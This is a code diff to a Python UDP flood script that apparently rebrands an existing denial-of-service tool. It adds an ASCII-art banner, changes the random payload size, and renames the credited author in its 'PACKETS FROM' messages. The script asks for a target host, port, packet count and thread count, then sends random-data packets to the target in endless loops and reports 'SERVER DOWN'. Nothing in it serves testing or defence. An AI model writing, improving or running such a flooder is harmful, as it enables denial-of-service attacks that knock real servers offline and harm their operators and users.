@@ -35,7 +35,13 @@ acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=
 "Accept-Language: en-US,en;q=0.5\r\n"]
 
 os.system("clear")
-print("UBAH INI")
+print("  _____    _ _      __  __         
+ |  ___|__| (_)_  __\ \/ /   _ ____
+ | |_ / _ \ | \ \/ / \  / | | |_  /
+ |  _|  __/ | |>  <  /  \ |_| |/ / 
+ |_|  \___|_|_/_/\_\/_/\_\__, /___|
+                         |___/     
+")
 print("\033[0m")         
 ip = str(input("[ ====> ] HOST/IP: "))
 port = int(input("[ ====> ] PORT : "))
@@ -44,7 +50,7 @@ times = int(input("[ ====> ] PACKETS : "))
 threads = int(input("[ ====> ] ISI PACKETS : "))
 os.system("clear")
 def run():
-	data = random._urandom(1800)
+	data = random._urandom(1026)
 	i = random.choice(("[•]","[•]","[•]"))
 	while True:
 		try:
@@ -52,7 +58,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" PACKETS FROM XALBADOR!!!")
+			print(i +" PACKETS FROM FELIX!!!")
 		except:
 			s.close()
 			print("[!] SERVER DOWN!!!")
@@ -66,7 +72,7 @@ def run2():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" PACKETS FROM XALBADOR!!!")
+			print(i +" PACKETS FROM FELIX!!!")
 		except:
 			s.close()
 			print("[!] SERVER DOWN!!!")
